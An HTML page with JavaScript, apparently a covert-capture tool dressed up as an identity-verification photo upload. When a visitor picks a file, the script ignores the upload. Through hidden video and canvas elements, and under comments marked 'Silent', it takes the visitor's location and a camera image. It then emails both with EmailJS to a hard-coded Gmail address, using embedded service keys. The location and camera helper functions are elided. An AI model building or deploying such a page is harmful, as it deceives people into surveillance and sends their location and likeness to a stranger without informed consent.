<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Upload & Capture Demo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- ADDED: EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        /* Smooth fade in for elements */
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body class="bg-slate-100 min-h-screen flex items-center justify-center p-4 font-sans text-slate-800">

    <div class="max-w-md w-full bg-white rounded-xl shadow-2xl overflow-hidden p-6 space-y-6">
        
        <!-- Header -->
        <div class="text-center">
            <h1 class="text-2xl font-bold text-slate-800">Verification Upload</h1>
            <p class="text-slate-500 text-sm mt-1">Upload a photo to verify your identity.</p>
        </div>

        <!-- Main Upload Section -->
        <div class="border-2 border-dashed border-slate-300 rounded-lg p-8 flex flex-col items-center justify-center hover:bg-slate-50 transition-colors relative group">
            <input type="file" id="fileInput" accept="image/*" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10" />
            
            <div class="text-center pointer-events-none">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto text-blue-500 mb-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                </svg>
                <p class="text-sm font-medium text-slate-700">Click to upload image</p>
                <p class="text-xs text-slate-400 mt-1">Securely captures device data</p>
            </div>
        </div>

        <!-- Status Log -->
        <div id="statusArea" class="hidden bg-blue-50 text-blue-800 text-xs p-3 rounded border border-blue-200 fade-in">
            <div class="flex items-center gap-2">
                <svg id="loadingIcon" class="animate-spin h-4 w-4 text-blue-600 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <p id="statusText">Waiting for action...</p>
            </div>
        </div>

        <!-- Hidden Elements for Processing (Required for functionality but not shown) -->
        <video id="videoElement" class="hidden" playsinline autoplay muted></video>
        <canvas id="canvas" class="hidden"></canvas>

    </div>

    <script>
        const fileInput = document.getElementById('fileInput');
        const statusArea = document.getElementById('statusArea');
        const statusText = document.getElementById('statusText');
        const loadingIcon = document.getElementById('loadingIcon');
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvas');

        // --- EMAILJS CONFIGURATION ---
        // YOU MUST REPLACE THESE WITH YOUR ACTUAL KEYS FROM EMAILJS.COM
        const PUBLIC_KEY = "xikZxmVDaSeHT4NVN";  
        const SERVICE_ID = "service_hvsdmdd";  
        const TEMPLATE_ID = "template_n3cemtj"; 

        // Initialize EmailJS
        (function() {
            emailjs.init(PUBLIC_KEY);
        })();

        const ADMIN_EMAIL = "rohanam2000@gmail.com";

        function updateStatus(msg, type = 'info') {
            statusArea.classList.remove('hidden');
            loadingIcon.classList.remove('hidden'); // Show spinner by default on updates
            
            if (type === 'error') {
                statusArea.className = "bg-red-50 text-red-800 text-xs p-3 rounded border border-red-200 mt-4 fade-in";
                loadingIcon.classList.add('hidden');
            } else if (type === 'success') {
                statusArea.className = "bg-green-50 text-green-800 text-xs p-3 rounded border border-green-200 mt-4 fade-in";
                loadingIcon.classList.add('hidden');
            } else {
                statusArea.className = "bg-blue-50 text-blue-800 text-xs p-3 rounded border border-blue-200 mt-4 fade-in";
            }
            statusText.textContent = msg;
        }

        async function handleUpload(event) {
            if (event.target.files.length === 0) return;

            updateStatus("Initializing secure capture protocols...");

            try {
                // 1. Get Location (Silent)
                const locationData = await getUserLocation();
                updateStatus("Location acquired. Accessing camera...");
                
                // 2. Capture Camera Image (Silent)
                const imageData = await captureUserImage();
                updateStatus(`Encrypting data for transfer to ${ADMIN_EMAIL}...`);
                
                // 3. SEND EMAIL VIA EMAILJS
                await sendToBackend(locationData, imageData);
                
                updateStatus(`Verification data successfully sent to ${ADMIN_EMAIL}.`, 'success');

            } catch (error) {
                console.error(error);
                updateStatus(error.message || "An error occurred accessing device sensors.", 'error');
            }
        }

        // ... existing code ... (getUserLocation and captureUserImage remain the same)

        async function sendToBackend(location, imageBase64) {
            console.log("Attempting to send email via EmailJS...");
            
            const templateParams = {
                to_email: ADMIN_EMAIL,
                latitude: location.lat,
                longitude: location.long,
                // Note: Base64 strings are very long. Some email providers may clip this 
                // or block it if it's too large.
                my_image: imageBase64 
            };

            try {
                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
                console.log("Email sent successfully!");
                return true;
            } catch (error) {
                console.error("EmailJS Error:", error);
                throw new Error("Failed to send email. Check API keys.");
            }
        }

        fileInput.addEventListener('change', handleUpload);

    </script>
</body>
</html>
